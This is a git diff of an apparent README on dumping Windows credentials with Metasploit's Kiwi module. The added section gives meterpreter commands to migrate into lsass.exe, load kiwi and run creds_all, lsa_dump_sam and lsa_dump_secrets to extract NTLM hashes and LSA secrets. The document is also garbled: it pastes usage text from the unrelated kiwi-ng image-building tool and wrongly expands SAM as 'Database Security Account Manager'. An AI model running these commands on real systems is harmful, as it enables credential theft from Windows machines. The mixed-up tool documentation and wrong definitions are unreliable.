@@ -1,8 +1,6 @@
 # Credential-Dumping-with-Kiwi
 Let's see how to dump the credentials with Kiwi
-
-
-
+Kiwi is based on Mimikatz, a tool that can extract various types of credentials from Windows systems, such as passwords, hashes, tickets, and tokens. Kiwi can be loaded as a module in Metasploit and used to perform various credential-oriented operations on compromised Windows machines. 
 ## usage: kiwi-ng [global options] service <command> [<args>]
        kiwi-ng -h | --help
        kiwi-ng [--profile=<name>...]
@@ -105,3 +103,20 @@ Let's see how to dump the credentials with Kiwi
         for this process to work a preparatory step to support the image
         architecture and binary format on the building host is required
         and not a responsibility of kiwi.
+
+## Kiwi <br>
+After an initial access (meterpreter session), migrate to the lsaas.exe and start kiwi.
+migrate -N lsass.exe (**Lsass.exe is a Windows process that stands for Local Security Authority Subsystem Service. It is responsible for security-related functions, such as user authentication, password changes, and security policies**)
+load kiwi<br>
+<img src="kiwi.png" width=70% height="auto"><br><br>
+ Dump Administrator NTLM hash: creds_all<br>
+<img src="creds.png" width=70% height="auto"><br><br>
+Extract all the users NTLM hash: lsa_dump_sam<br>
+<img src="sam.png" width=70% height="auto"><br><br>
+Find the syskey by dumping the LSA secrets: lsa_dump_secrets<br>
+<img src="sys.png" width=70% height="auto"><br><br>
+
+**DB SAM is a database system that securely stores user credentials, such as usernames and passwords, for Windows operating systems. It is also responsible for user authentication and security policy enforcement1. DB SAM stands for Database Security Account Manager.**
+
+#Author
+<b>Xiao Li Savio Feng</b>
